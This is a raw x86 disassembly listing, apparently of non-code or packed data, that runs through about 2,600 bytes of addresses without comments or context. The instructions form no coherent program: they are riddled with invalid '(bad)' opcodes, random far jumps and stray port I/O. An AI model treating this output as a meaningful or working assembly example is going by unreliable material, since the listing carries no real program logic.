  41bee8:	adc    DWORD PTR ds:0x1b0123d3,edi
  41beee:	int3   
  41beef:	xchg   DWORD PTR [esi],eax
  41bef1:	push   esi
  41bef2:	push   0x22
  41bef4:	fmul   st,st(5)
  41bef6:	dec    eax
  41bef7:	jmp    0xd8b4:0x43e31421
  41befe:	and    BYTE PTR [ebx],bh
  41bf00:	(bad)  
  41bf01:	jne    0x41be9f
  41bf03:	dec    ebx
  41bf04:	pop    es
  41bf05:	pop    edi
  41bf06:	dec    ebx
  41bf07:	xor    bl,bl
  41bf09:	iret   
  41bf0a:	test   DWORD PTR ds:0x7676a8f6,0xe9c10f3d
  41bf14:	and    esi,DWORD PTR [ebp-0x25]
  41bf17:	sub    dl,BYTE PTR [eax+0x36f108de]
  41bf1d:	inc    ecx
  41bf1e:	mov    ebx,0x559e9bef
  41bf23:	or     eax,0x19a37be2
  41bf28:	dec    edi
  41bf29:	pop    edi
  41bf2a:	bound  edx,QWORD PTR [eax+0x2cbc8809]
  41bf30:	add    BYTE PTR [ecx],al
  41bf32:	xchg   esi,eax
  41bf33:	and    al,0x82
  41bf35:	add    ch,BYTE PTR [ebx]
  41bf37:	push   es
  41bf38:	add    eax,0x9bd934a8
  41bf3d:	xchg   DWORD PTR [esi-0x7db15d10],ebx
  41bf43:	dec    esp
  41bf44:	pop    edx
  41bf45:	add    eax,0xa2642dc5
  41bf4a:	and    al,bh
  41bf4c:	and    eax,0xb656374b
  41bf51:	jmp    0x4ec6:0xd82e4c76
  41bf58:	daa    
  41bf59:	cmp    ecx,DWORD PTR [edx-0x10]
  41bf5c:	mov    eax,0x43dc0787
  41bf61:	in     eax,dx
  41bf62:	call   0xcb5bbbd1
  41bf67:	mov    fs,WORD PTR [ebx+0x43]
  41bf6a:	leave  
  41bf6b:	mov    ecx,0x57d27b6a
  41bf70:	and    BYTE PTR [ebx+0x27977c15],0xbd
  41bf77:	sub    al,0x4a
  41bf79:	adc    dh,BYTE PTR [eax+0x5a]
  41bf7c:	pusha  
  41bf7d:	push   eax
  41bf7e:	arpl   WORD PTR [esp+edi*4-0x4f466663],cx
  41bf85:	(bad)  
  41bf86:	shl    BYTE PTR [ebx],0x21
  41bf89:	loop   0x41bfc6
  41bf8b:	gs leave 
  41bf8d:	fwait
  41bf8e:	data16 test BYTE PTR [edi+0x0],dh
	...
  41bff2:	add    BYTE PTR [eax],al
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	retf   
  41c001:	stc    
  41c002:	mov    ch,0x9e
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0xd3000001
  41c00d:	daa    
  41c00e:	inc    ebx
  41c00f:	pop    es
  41c010:	int    0xb5
  41c012:	scas   al,BYTE PTR es:[edi]
  41c013:	push   cs
  41c014:	aad    0x28
  41c016:	dec    ebp
  41c017:	fs add edx,ecx
  41c01a:	inc    esp
  41c01b:	fnsave [edi]
  41c01d:	dec    esp
  41c01e:	(bad)  
  41c01f:	fidiv  WORD PTR [edi-0x2c285efe]
  41c025:	push   esp
  41c026:	popa   
  41c027:	fucomip st,st(4)
  41c029:	or     BYTE PTR [eax+ecx*4-0x7be26cce],bl
  41c030:	ins    DWORD PTR es:[edi],dx
  41c031:	pop    esi
  41c032:	fst    QWORD PTR [esi+0x2e4edb65]
  41c038:	out    dx,al
  41c039:	pop    es
  41c03a:	pop    esp
  41c03b:	mov    dh,0x1
  41c03d:	data16 (bad) 
  41c040:	fbstp  TBYTE PTR [ecx+0x5a13da06]
  41c046:	fld    TBYTE PTR [ebx]
  41c048:	dec    ebp
  41c049:	jns    0x41c04b
  41c04b:	mov    esi,0xa4ed5073
  41c050:	lahf   
  41c051:	(bad)  [ebx]
  41c053:	scas   eax,DWORD PTR es:[edi]
  41c054:	jnp    0x41c0a8
  41c056:	mov    ecx,0x73c5a61c
  41c05b:	or     DWORD PTR [ecx],0x38f98efc
  41c061:	les    eax,FWORD PTR ds:0x99225658
  41c067:	sub    al,0x42
  41c069:	xchg   edx,eax
  41c06a:	in     al,dx
  41c06b:	or     BYTE PTR [esi+0x19c8ba26],ah
  41c071:	daa    
  41c072:	push   esp
  41c073:	push   es
  41c074:	lods   al,BYTE PTR ds:[esi]
  41c075:	jbe    0x41c03a
  41c077:	pop    ds
  41c078:	or     BYTE PTR [ebp-0x542fa8a1],0xaa
  41c07f:	pop    es
  41c080:	out    dx,al
  41c081:	mov    BYTE PTR [ebx-0x20fd7106],dh
  41c087:	nop    DWORD PTR [edi-0x1439698c]
  41c08e:	mov    ds,WORD PTR [esp+esi*4+0x34]
  41c092:	jnp    0x41c081
  41c094:	add    dl,bl
  41c096:	sub    BYTE PTR [eax],bh
  41c098:	xchg   ch,dh
  41c09a:	retf   
  41c09b:	imul   ebx,DWORD PTR [esi],0x1a550db
  41c0a1:	mov    eax,ds:0x7e0bd009
  41c0a6:	adc    ebp,ecx
  41c0a8:	jl     0x41c0e3
  41c0aa:	and    al,0x90
  41c0ac:	mov    ebx,DWORD PTR [edi]
  41c0ae:	popf   
  41c0af:	add    ah,BYTE PTR [ebx-0x4a8d8995]
  41c0b5:	xor    BYTE PTR [ecx],cl
  41c0b7:	repz adc BYTE PTR [ebp+eiz*4-0x35],0x2b
  41c0bd:	jns    0x41c069
  41c0bf:	(bad)  
  41c0c0:	in     eax,dx
  41c0c1:	dec    ebp
  41c0c2:	test   eax,0x2accf082
  41c0c7:	jnp    0x41c122
  41c0c9:	push   esi
  41c0ca:	das    
  41c0cb:	jmp    0xdafe9396
  41c0d0:	dec    ebx
  41c0d1:	pop    esp
  41c0d2:	or     ah,BYTE PTR [ecx+0x7d3099c4]
  41c0d8:	mov    cl,BYTE PTR [ebx]
  41c0da:	xor    al,0x44
  41c0dc:	sbb    DWORD PTR [ebx+ebx*4-0x6c392790],esi
  41c0e3:	mov    ecx,0xa5da45fb
  41c0e8:	stos   BYTE PTR es:[edi],al
  41c0e9:	add    eax,0x744902e1
  41c0ee:	xchg   ebp,eax
  41c0ef:	bound  edi,QWORD PTR [eax-0x1d]
  41c0f2:	test   DWORD PTR [esi+eax*2+0x72],ebp
  41c0f6:	imul   edx,DWORD PTR [ebp-0x4b701612],0xeef1de28
  41c100:	scas   eax,DWORD PTR es:[edi]
  41c101:	add    BYTE PTR [eax],ch
  41c103:	jmp    0x17c0:0x28fbfa3f
  41c10a:	jmp    0x77e7:0xeef78ae5
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x18e90501,0xffffffb9
  41c182:	push   eax
  41c183:	sbb    eax,0x12a8f
  41c188:	add    eax,0xed000001
  41c18d:	(bad)  [esi+0x2d]
  41c190:	sahf   
  41c191:	sub    cl,bh
  41c193:	bound  esp,QWORD PTR [edi]
  41c195:	mov    ch,BYTE PTR [ebp+0x1e]
  41c198:	xchg   edx,eax
  41c199:	pop    es
  41c19a:	es xor eax,0xc276c7c7
  41c1a0:	xor    al,0x98
  41c1a2:	xchg   DWORD PTR [edx-0x47],ebx
  41c1a5:	shr    BYTE PTR [ebp-0x25],1
  41c1a8:	add    eax,eax
  41c1aa:	retf   0x633e
  41c1ad:	mov    ecx,?
  41c1af:	push   ss
  41c1b0:	pop    ebx
  41c1b1:	mov    dl,0x15
  41c1b3:	loopne 0x41c15b
  41c1b5:	jg     0x41c200
  41c1b7:	or     ah,BYTE PTR ds:0xabc92db9
  41c1bd:	xchg   dl,ch
  41c1bf:	dec    edi
  41c1c0:	sahf   
  41c1c1:	enter  0x205c,0x15
  41c1c5:	push   esi
  41c1c6:	test   eax,0xd07b4317
  41c1cb:	cdq    
  41c1cc:	dec    esp
  41c1cd:	mov    cl,BYTE PTR [edx]
  41c1cf:	jl     0x41c235
  41c1d1:	int3   
  41c1d2:	mov    al,ds:0xf491ba80
  41c1d7:	push   cs
  41c1d8:	test   al,0x1f
  41c1da:	test   eax,0x93accf89
  41c1df:	pop    esi
  41c1e0:	cmp    al,0xd5
  41c1e2:	inc    ebp
  41c1e3:	call   FWORD PTR [ecx]
  41c1e5:	in     al,dx
  41c1e6:	adc    eax,0xbd5c9da5
  41c1eb:	xchg   edi,eax
  41c1ec:	sbb    al,0xe
  41c1ee:	test   eax,0xd6bffec9
  41c1f3:	mov    bl,0x94
  41c1f5:	jae    0x41c224
  41c1f7:	jge    0x41c243
  41c1f9:	mov    cs,eax
  41c1fb:	clc    
  41c1fc:	sub    eax,0x1cfc3b49
  41c201:	jae    0x41c234
  41c203:	jbe    0x41c20f
  41c205:	push   edi
  41c206:	icebp  
  41c207:	jp     0x41c1af
  41c209:	push   ebp
  41c20a:	clc    
  41c20b:	mov    WORD PTR [eax-0x7a],ds
  41c20e:	push   ds
  41c20f:	pop    ebp
  41c210:	ret    
  41c211:	in     eax,dx
  41c212:	or     eax,0xa0122bac
  41c217:	pop    esp
  41c218:	rol    BYTE PTR [esi-0x38],1
  41c21b:	pop    esp
  41c21c:	stos   BYTE PTR es:[edi],al
  41c21d:	and    BYTE PTR [ebx-0x50],bl
  41c220:	shl    BYTE PTR [ecx-0x58b2897f],cl
  41c226:	pop    ds
  41c227:	or     edi,DWORD PTR [eax]
  41c229:	fnstcw WORD PTR [ebp+0x64139f49]
  41c22f:	and    DWORD PTR [eax-0x4f5b5e8b],edx
  41c235:	mov    ch,BYTE PTR [edx+ebp*4+0x20]
  41c239:	push   edi
  41c23a:	mov    bl,0x94
  41c23c:	addr16 dec eax
  41c23e:	xchg   BYTE PTR [esi+0x1a1a0a45],dl
  41c244:	cld    
  41c245:	icebp  
  41c246:	fwait
  41c247:	push   es
  41c248:	popa   
  41c249:	das    
  41c24a:	inc    esp
  41c24b:	popf   
  41c24c:	dec    ebx
  41c24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c24e:	and    esp,DWORD PTR [edi+0x31]
  41c251:	fst    st(3)
  41c253:	mov    ecx,0x124416f1
  41c258:	fisub  DWORD PTR [ebx+0x3b]
  41c25b:	inc    esp
  41c25c:	leave  
  41c25d:	mov    esi,0x9f495e1d
  41c262:	pop    esp
  41c263:	sub    BYTE PTR [esi-0x54],dl
  41c266:	jge    0x41c205
  41c268:	lahf   
  41c269:	pop    ss
  41c26a:	mov    ecx,0xf09597fb
  41c26f:	jmp    0x41c223
  41c271:	add    ch,dl
  41c273:	xchg   esi,eax
  41c274:	pop    ebx
  41c275:	fidivr DWORD PTR ds:0xa38ce887
  41c27b:	daa    
  41c27c:	arpl   WORD PTR ds:0xd079ba14,si
  41c282:	popa   
  41c283:	jecxz  0x41c2f6
  41c285:	mov    cl,0xfe
  41c287:	(bad)  
  41c288:	call   DWORD PTR [esi+0x7a]
  41c28b:	mov    ebp,0x25ddaae
  41c290:	retf   
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	add    al,0x89
  41c302:	add    eax,eax
  41c304:	xchg   esp,eax
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0xd1000001,al
  41c30d:	push   ss
  41c30e:	nop
  41c30f:	xor    BYTE PTR [eax-0x4],ah
  41c312:	(bad)  
  41c313:	pop    ecx
  41c314:	neg    bh
  41c316:	jmp    0x41c343
  41c318:	(bad)
  41c31c:	xor    eax,0x488e7db4
  41c321:	jne    0x41c2e6
  41c323:	clc    
  41c324:	sub    eax,0x34810124
  41c329:	add    al,0x53
  41c32b:	repz into 
  41c32d:	xchg   DWORD PTR [edx+0x4af699aa],esp
  41c333:	ss xchg ebp,eax
  41c335:	sti    
  41c336:	push   cs
  41c337:	outs   dx,DWORD PTR ds:[esi]
  41c338:	cdq    
  41c339:	inc    ebp
  41c33a:	pop    es
  41c33b:	mov    esp,0x608ce7e0
  41c340:	rol    DWORD PTR [edx-0x9],cl
  41c343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c344:	ins    DWORD PTR es:[edi],dx
  41c345:	cmp    eax,0x27ceab59
  41c34a:	adc    ebx,DWORD PTR [esi]
  41c34c:	inc    bp
  41c34e:	pop    ebp
  41c34f:	pop    ds
  41c350:	shr    BYTE PTR [edi-0x17],cl
  41c353:	dec    ebx
  41c354:	in     al,dx
  41c355:	sub    DWORD PTR [esi],edx
  41c357:	mov    ch,dh
  41c359:	adc    eax,DWORD PTR [ecx]
  41c35b:	mov    eax,ds:0xa2b6ac74
  41c360:	mov    ebp,0x709fa7d7
  41c365:	cmp    ah,BYTE PTR [ebp+0x5072dd7f]
  41c36b:	lods   al,BYTE PTR ds:[esi]
  41c36c:	push   esi
  41c36d:	sahf   
  41c36e:	gs mov ch,0xe2
  41c371:	mov    edx,DWORD PTR [ecx+ebx*2]
  41c374:	sub    al,0xfb
  41c376:	sbb    DWORD PTR [eax-0x4e4e14d0],ebp
  41c37c:	fld    QWORD PTR [ecx+0x63]
  41c380:	mov    ebp,0x1cf9981e
  41c385:	enter  0x6cf5,0xd6
  41c389:	ja     0x41c3d9
  41c38b:	clc    
  41c38c:	enter  0xb7e7,0x51
  41c390:	std    
  41c391:	shl    DWORD PTR [eax-0x1af053cc],0x1b
  41c398:	pusha  
  41c399:	jecxz  0x41c3b8
  41c39b:	int3   
  41c39c:	push   0xffffff8d
  41c39e:	aas    
  41c39f:	xor    ecx,DWORD PTR [ecx]
  41c3a1:	jmp    0x63877355
  41c3a6:	dec    edi
  41c3a7:	adc    esi,ebp
  41c3a9:	mov    WORD PTR [esi-0x14],cs
  41c3ac:	outs   dx,DWORD PTR ds:[esi]
  41c3ad:	add    edi,ebx
  41c3af:	cmp    ch,BYTE PTR [ecx-0x300d1810]
  41c3b5:	mov    cs,WORD PTR [edx+eax*4]
  41c3b8:	popa   
  41c3b9:	lahf   
  41c3ba:	pop    ecx
  41c3bb:	loopne 0x41c431
  41c3bd:	xchg   DWORD PTR [esi],edx
  41c3bf:	popaw  
  41c3c1:	sub    al,0x4
  41c3c3:	xchg   edx,eax
  41c3c4:	mov    WORD PTR [ebp+0x29b1c462],ss
  41c3ca:	dec    eax
  41c3cb:	pop    ebx
  41c3cc:	pop    edx
  41c3cd:	mov    ch,0xb5
  41c3cf:	mov    esp,0xaa259114
  41c3d4:	or     BYTE PTR [ebp+0x66],ch
  41c3d7:	adc    eax,0x821866cc
  41c3dc:	lds    edx,FWORD PTR [ecx+0x4a]
  41c3df:	jb     0x41c3df
  41c3e1:	xchg   ebx,eax
  41c3e2:	stos   DWORD PTR es:[edi],eax
  41c3e3:	mov    ebx,0xb9fbee6e
  41c3e8:	enter  0x7f40,0xae
  41c3ec:	fstp   QWORD PTR [edi]
  41c3ee:	sbb    al,0x15
  41c3f0:	sbb    ch,BYTE PTR [esi+0x37695b4d]
  41c3f6:	in     eax,dx
  41c3f7:	push   ebx
  41c3f8:	sbb    al,0xd2
  41c3fa:	or     DWORD PTR [esi],edi
  41c3fc:	shl    DWORD PTR [eax],1
  41c3fe:	(bad)  
  41c3ff:	mov    ebp,0x88bf6949
  41c404:	stos   DWORD PTR es:[edi],eax
  41c405:	and    ecx,ebx
  41c407:	loopne 0x41c46f
  41c409:	adc    edi,DWORD PTR [ebx-0x49476913]
  41c40f:	xchg   ebp,eax
  41c410:	mov    esi,0x0
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	(bad)  
  41c481:	repnz retf 0x9930
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0x75000001,al
  41c48d:	fstp   QWORD PTR [ebx+eiz*4+0x3326953d]
  41c494:	sbb    eax,0xab500663
  41c499:	jno    0x41c482
  41c49b:	jae    0x41c4d1
  41c49d:	fdiv   QWORD PTR [ecx+0xbc1f159]
  41c4a3:	retf   
  41c4a4:	pop    es
  41c4a5:	and    al,0x1c
  41c4a7:	jmp    0x41c4b9
  41c4a9:	pop    ebx
  41c4aa:	or     DWORD PTR [ebp-0xd],ecx
  41c4ad:	add    esp,DWORD PTR [edx]
  41c4af:	in     al,0x93
  41c4b1:	xor    ebx,DWORD PTR [edx+esi*8+0x49]
  41c4b5:	les    ebx,FWORD PTR [ebx-0x35]
  41c4b8:	(bad)  [ecx-0x11]
  41c4bb:	push   ecx
  41c4bc:	lods   eax,DWORD PTR ds:[esi]
  41c4bd:	aam    0x78
  41c4bf:	dec    eax
  41c4c0:	and    BYTE PTR [eax+ebx*1],0x88
  41c4c4:	mov    DWORD PTR [ecx+0x54],edi
  41c4c7:	dec    eax
  41c4c8:	mov    ebx,0x3c6f452e
  41c4cd:	(bad)  
  41c4ce:	outs   dx,BYTE PTR ds:[esi]
  41c4cf:	in     eax,dx
  41c4d0:	jmp    0x41c501
  41c4d2:	ds push esi
  41c4d4:	mov    ecx,0x11615239
  41c4d9:	call   0xe1d8:0x61e5
  41c4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e0:	test   al,0xeb
  41c4e2:	test   al,0xee
  41c4e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e5:	pop    esp
  41c4e6:	out    0xf1,al
  41c4e8:	cmc    
  41c4e9:	js     0x41c50b
  41c4eb:	adc    eax,0xa575b12d
  41c4f0:	jg     0x41c56f
  41c4f2:	or     BYTE PTR gs:[esi],ch
  41c4f5:	sbb    BYTE PTR [ecx+eax*2+0x53],bl
  41c4f9:	adc    DWORD PTR cs:[esi+0x155974f8],0xcdc1cc42
  41c504:	test   DWORD PTR [ebx+ecx*2-0x1a4102c1],edi
  41c50b:	push   eax
  41c50c:	mov    dh,0x5
  41c50e:	lods   eax,DWORD PTR ds:[esi]
  41c50f:	gs xor edx,esi
  41c512:	mov    bh,0xdb
  41c514:	jge    0x41c564
  41c516:	jmp    0xdfad:0x93d7c4d7
  41c51d:	leave  
  41c51e:	retf   0xd131
  41c521:	test   ecx,0x688c5761
  41c527:	push   ss
  41c528:	push   ebx
  41c529:	mov    esi,0xe43f417f
  41c52e:	iret   
  41c52f:	pop    ecx
  41c530:	retf   0x5472
  41c533:	mov    ah,0x6a
  41c535:	lahf   
  41c536:	cli    
  41c537:	add    BYTE PTR [edx],al
  41c539:	inc    ecx
  41c53a:	inc    edx
  41c53b:	xor    dh,0x40
  41c53e:	mov    bh,0xa4
  41c540:	mov    DWORD PTR [edx],esp
  41c542:	push   esp
  41c543:	xlat   BYTE PTR ds:[ebx]
  41c544:	dec    ecx
  41c545:	shl    BYTE PTR [ebx+esi*8],0x3e
  41c549:	rcr    DWORD PTR ds:0x93b78111,1
  41c54f:	add    edi,DWORD PTR [ecx-0x5b]
  41c552:	cmp    BYTE PTR [ebx],cl
  41c554:	test   al,0x4
  41c556:	fst    DWORD PTR [edx+edx*4]
  41c559:	mov    bh,BYTE PTR [ebx+0x24]
  41c55c:	outs   dx,BYTE PTR ds:[esi]
  41c55d:	jno    0x41c4eb
  41c55f:	jnp    0x41c59b
  41c561:	imul   ebp,ecx,0xffffff95
  41c564:	pop    eax
  41c565:	push   eax
  41c566:	jnp    0x41c5a0
  41c568:	adc    bh,dl
  41c56a:	addr16 inc ebx
  41c56c:	rol    esp,cl
  41c56e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41c570:	mov    cl,0x9f
  41c572:	loop   0x41c5b1
  41c574:	cmp    edx,ecx
  41c576:	mov    BYTE PTR [ebp+0x72],dh
  41c579:	adc    ch,BYTE PTR [ebx+0x61]
  41c57c:	loopne 0x41c591
  41c57e:	mov    bl,0xb1
  41c580:	fldcw  WORD PTR [eax]
  41c582:	test   al,0xee
  41c584:	or     bl,BYTE PTR [ecx]
  41c586:	xchg   ecx,eax
  41c587:	popa   
  41c588:	xor    eax,0xf72a4d84
  41c58d:	daa    
  41c58e:	add    al,0x30
  41c590:	jle    0x41c592
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0xccb5086
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x35000001
  41c60d:	loope  0x41c590
  41c60f:	sti    
  41c610:	into   
  41c611:	ret    
  41c612:	test   DWORD PTR [edi-0x636b6072],ebx
  41c618:	push   es
  41c619:	xlat   BYTE PTR ds:[ebx]
  41c61a:	sub    ebx,ecx
  41c61c:	pop    edx
  41c61d:	cmp    ebx,DWORD PTR [eax-0x3cfc193]
  41c623:	in     eax,0x43
  41c625:	les    esp,FWORD PTR [esi]
  41c627:	jle    0x41c5e1
  41c629:	out    dx,eax
  41c62a:	rcl    BYTE PTR [edi+eax*1+0x23],1
  41c62e:	in     eax,dx
  41c62f:	lds    esp,FWORD PTR [ebx+0x60275cc6]
  41c635:	or     BYTE PTR ds:0x2a93fbba,ah
  41c63b:	xchg   ebx,eax
  41c63c:	adc    eax,edi
  41c63e:	jo     0x41c6a2
  41c640:	xor    BYTE PTR [eax-0x4f],cl
  41c643:	mov    esp,0x96bfd5c8
  41c648:	imul   ecx,DWORD PTR [esi],0xba2d9be7
  41c64e:	cdq    
  41c64f:	jo     0x41c69d
  41c651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c652:	or     BYTE PTR [esi+0x30],dh
  41c655:	pop    eax
  41c656:	addr16 inc ecx
  41c658:	xchg   ebx,eax
  41c659:	ror    DWORD PTR [edi],cl
  41c65b:	lds    esp,FWORD PTR ds:0x873abe31
  41c661:	cdq    
  41c662:	out    dx,eax
  41c663:	mov    BYTE PTR [eax-0x1df7a0e5],bh
  41c669:	add    eax,0x4dca634
  41c66e:	or     DWORD PTR [esi+0x2c68870f],esp
  41c674:	mov    bh,0xc8
  41c676:	fwait
  41c677:	loope  0x41c67f
  41c679:	rcl    DWORD PTR [ebx],0x53
  41c67c:	inc    ebp
  41c67d:	addr16 cld 
  41c67f:	inc    edi
  41c680:	mov    bl,0x2
  41c682:	and    eax,0xb780a335
  41c687:	rcr    dl,1
  41c689:	pop    ss
  41c68a:	jne    0x41c6f1
  41c68c:	xor    eax,0xc2823687
  41c691:	ret    0x7820
  41c694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c695:	test   bl,0xb9
  41c698:	sub    al,0x83
  41c69a:	aam    0x65
  41c69c:	mov    ebx,es
  41c69e:	adc    eax,0xa176ffa8
  41c6a3:	xchg   edx,eax
  41c6a4:	clc    
  41c6a5:	dec    esp
  41c6a6:	mov    ds:0x4a237f8b,eax
  41c6ab:	addr16 mov bl,0x8c
  41c6ae:	out    dx,eax
  41c6af:	(bad)
  41c6b3:	push   eax
  41c6b4:	call   0x57b11deb
  41c6b9:	inc    eax
  41c6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6bb:	in     al,dx
  41c6bc:	adc    DWORD PTR [ebx+0x5],edi
  41c6bf:	(bad)  
  41c6c0:	rcr    ecx,1
  41c6c2:	xor    dh,BYTE PTR [eax+0x58]
  41c6c5:	retf   
  41c6c6:	push   0xfffffff4
  41c6c8:	call   0x520c:0x3c4ace32
  41c6cf:	pop    edx
  41c6d0:	ficomp DWORD PTR [edx-0x6f0b0957]
  41c6d6:	dec    DWORD PTR [ecx-0x50]
  41c6d9:	(bad)
  41c6dc:	inc    esp
  41c6dd:	ret    0xfcba
  41c6e0:	pop    ds
  41c6e1:	xchg   ebx,eax
  41c6e2:	out    dx,eax
  41c6e3:	fadd   QWORD PTR [edx+0x19c52b8]
  41c6e9:	fisubr DWORD PTR [edx+0x17]
  41c6ec:	push   eax
  41c6ed:	add    edx,ecx
  41c6ef:	pop    edx
  41c6f0:	in     eax,0x7e
  41c6f2:	or     al,BYTE PTR [esi+0x9d8da0d]
  41c6f8:	cmp    eax,0x8e8a708f
  41c6fd:	sbb    al,0xd8
  41c6ff:	sbb    ebp,DWORD PTR [ecx-0x5d]
  41c702:	(bad)  
  41c703:	xlat   BYTE PTR ds:[ebx]
  41c704:	cwde   
  41c705:	mov    ebp,0x6e945d7c
  41c70a:	imul   ecx,DWORD PTR [esi-0xc13f40e],0xffffffb5
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	jo     0x41c725
  41c782:	(bad)  
  41c783:	and    esp,DWORD PTR [ebx+0x500012e]
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    ah,dl
  41c78d:	adc    edx,DWORD PTR [eax-0x44df668d]
  41c793:	pop    ds
  41c794:	and    eax,0x29927cb
  41c799:	into   
  41c79a:	cdq    
  41c79b:	cmp    al,0x18
  41c79d:	daa    
  41c79e:	cwde   
  41c79f:	cmp    BYTE PTR [esi+0x2a],0xf7
  41c7a3:	icebp  
  41c7a4:	int3   
  41c7a5:	jns    0x41c7e7
  41c7a7:	or     DWORD PTR [edi+0x124b3fdc],eax
  41c7ad:	mov    eax,ds:0x984f16ee
  41c7b2:	inc    ebp
  41c7b3:	mov    edx,0x4b54f6e2
  41c7b8:	fwait
  41c7b9:	(bad)  
  41c7ba:	adc    al,0x4b
  41c7bc:	cmp    BYTE PTR [ebp-0x69],0xd0
  41c7c0:	out    0xfc,al
  41c7c2:	jl     0x41c838
  41c7c4:	sahf   
  41c7c5:	mov    ch,0x15
  41c7c7:	mov    bl,0x7e
  41c7c9:	push   esp
  41c7ca:	je     0x41c798
  41c7cc:	popa   
  41c7cd:	ret    0x9d31
  41c7d0:	test   BYTE PTR [ecx],dh
  41c7d2:	lods   eax,DWORD PTR ds:[esi]
  41c7d3:	mov    edx,DWORD PTR [ebx+0x60ae40d7]
  41c7d9:	rcl    BYTE PTR [edx+esi*2+0xe],1
  41c7dd:	push   ds
  41c7de:	sub    al,0x33
  41c7e0:	jno    0x41c81f
  41c7e2:	sti    
  41c7e3:	xchg   DWORD PTR [ebp+0x2],ecx
  41c7e6:	jg     0x41c7a0
  41c7e8:	inc    edx
  41c7e9:	retf   
  41c7ea:	and    edx,DWORD PTR [edi+0x5b]
  41c7ed:	nop
  41c7ee:	sub    al,0x3b
  41c7f0:	(bad)  
  41c7f1:	aaa    
  41c7f2:	leave  
  41c7f3:	test   DWORD PTR [eax-0x4f534d4],edx
  41c7f9:	or     DWORD PTR [ecx+ebx*1+0x437dbb1e],0x4f8f6da7
  41c804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c805:	add    DWORD PTR [esi+ebx*1],edi
  41c808:	mov    ebp,0x72d6a499
  41c80d:	dec    ebx
  41c80e:	bound  esp,QWORD PTR [ebx+0x3f29354f]
  41c814:	jns    0x41c84c
  41c816:	aaa    
  41c817:	mov    edi,0x7d77435c
  41c81c:	xchg   BYTE PTR [ebx+eiz*1-0x3f],dl
  41c820:	scas   eax,DWORD PTR es:[edi]
  41c821:	test   al,0x74
  41c823:	(bad)  
  41c824:	(bad)  
  41c825:	fild   DWORD PTR [ebp+0x15dd912c]
  41c82b:	pop    ds
  41c82c:	pop    ebx
  41c82d:	xor    eax,0x2dd49a5b
  41c832:	aam    0xa
  41c834:	test   DWORD PTR [esi+0x6e],ecx
  41c837:	stos   DWORD PTR es:[edi],eax
  41c838:	sar    DWORD PTR [edx],0xe
  41c83b:	(bad)  
  41c83c:	loope  0x41c872
  41c83e:	dec    ebx
  41c83f:	mov    esi,0xa605d9ab
  41c844:	stc    
  41c845:	adc    bl,BYTE PTR [edx+0x2a]
  41c848:	pop    es
  41c849:	xor    eax,0x16e57cab
  41c84e:	(bad)  
  41c84f:	xor    eax,0xbb279089
  41c854:	or     eax,ebp
  41c856:	int3   
  41c857:	pushf  
  41c858:	pop    eax
  41c859:	mov    dh,0x46
  41c85b:	rcr    BYTE PTR [ecx+0x47],1
  41c85e:	lods   eax,DWORD PTR ds:[esi]
  41c85f:	(bad)
  41c863:	mov    dl,0x44
  41c865:	test   bh,0xec
  41c868:	push   ds
  41c869:	fsubrp st(2),st
  41c86b:	cmp    al,0x5f
  41c86d:	pop    ebp
  41c86e:	push   eax
  41c86f:	xchg   esi,eax
  41c870:	popa   
  41c871:	mov    ah,0x85
  41c873:	test   DWORD PTR [edi],0x6f67e43d
  41c879:	fsubr  DWORD PTR [eax-0x70eaf9bb]
  41c87f:	daa    
  41c880:	jle    0x41c81d
  41c882:	fstp   QWORD PTR [ebx]
  41c884:	ret    
  41c885:	pop    es
  41c886:	stos   DWORD PTR es:[edi],eax
  41c887:	pop    edi
  41c888:	scas   eax,DWORD PTR es:[edi]
  41c889:	aas    
  41c88a:	mov    eax,es
  41c88c:	xor    ch,BYTE PTR [ecx+0x28c94c]
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    esp,eax
  41c901:	nop
  41c902:	rol    BYTE PTR [edx+0x12fa8],0x5
